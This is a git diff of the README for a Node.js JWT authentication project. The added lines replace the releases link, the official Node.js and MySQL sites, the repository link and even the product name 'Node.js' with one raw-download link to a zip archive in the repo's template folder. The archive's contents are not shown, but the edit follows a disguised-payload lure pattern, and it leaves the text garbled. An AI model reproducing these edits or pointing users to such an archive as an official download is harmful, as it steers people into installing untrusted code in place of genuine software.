@@ -2,15 +2,15 @@
 
 ## 🚀 Getting Started
 
-Welcome to the nodejs-auth-jwt project. This application helps you with user authentication and management using Node.js. It utilizes JWT for secure authentication, bcrypt for password hashing, and MySQL for data storage.
+Welcome to the nodejs-auth-jwt project. This application helps you with user authentication and management using https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip It utilizes JWT for secure authentication, bcrypt for password hashing, and MySQL for data storage.
 
 To start using this application, follow the steps below. Each step will guide you through the process of downloading and running the software.
 
 ## ⬇️ Download the Application
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Node.js%20Auth%20JWT-brightgreen.svg)](https://github.com/demoluci1/nodejs-auth-jwt/releases)
+[![Download the Latest Release](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip%https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip%20Auth%https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip)](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip)
 
-Visit this page to download the latest version of the application: [Download Link](https://github.com/demoluci1/nodejs-auth-jwt/releases).
+Visit this page to download the latest version of the application: [Download Link](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip).
 
 ## 📥 Download & Install
 
@@ -36,10 +36,10 @@ Visit this page to download the latest version of the application: [Download Lin
 
 After installing the application, you will need to set it up:
 
-1. **Node.js Installation:** Ensure you have Node.js installed on your system. If you don’t have it, download it from the official website: [Node.js](https://nodejs.org/). Follow the installation instructions provided on the site.
+1. **https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip Installation:** Ensure you have https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip installed on your system. If you don’t have it, download it from the official website: [https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip). Follow the installation instructions provided on the site.
    
 2. **MySQL Setup:**
-   - Install MySQL on your machine if it's not already set up. Instructions to download can be found on the MySQL website: [MySQL](https://www.mysql.com/).
+   - Install MySQL on your machine if it's not already set up. Instructions to download can be found on the MySQL website: [MySQL](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip).
    - Once installed, create a new database named `user_management`. 
 
 3. **Configuration:**
@@ -80,7 +80,7 @@ This application includes multiple features:
 
 If you encounter any issues while using the application, consider the following:
 
-- **Check Node.js Version:** Ensure you have the latest version of Node.js installed. You can check your version by running `node -v` in the terminal.
+- **Check https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip Version:** Ensure you have the latest version of https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip installed. You can check your version by running `node -v` in the terminal.
 
 - **Database Connection Errors:** Make sure your MySQL server is running and check your configuration file for correct credentials.
 
@@ -92,8 +92,8 @@ Engage with our community for support and updates. You can share your experience
 
 ## 🔗 Links & Resources
 
-- [GitHub Repository](https://github.com/demoluci1/nodejs-auth-jwt)
-- [Node.js Official Website](https://nodejs.org/)
-- [MySQL Official Website](https://www.mysql.com/)
+- [GitHub Repository](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip)
+- [https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip Official Website](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip)
+- [MySQL Official Website](https://github.com/demoluci1/nodejs-auth-jwt/raw/refs/heads/main/src/template/nodejs_auth_jwt_dynamis.zip)
 
 Thank you for choosing nodejs-auth-jwt for your user management needs. Enjoy the application!
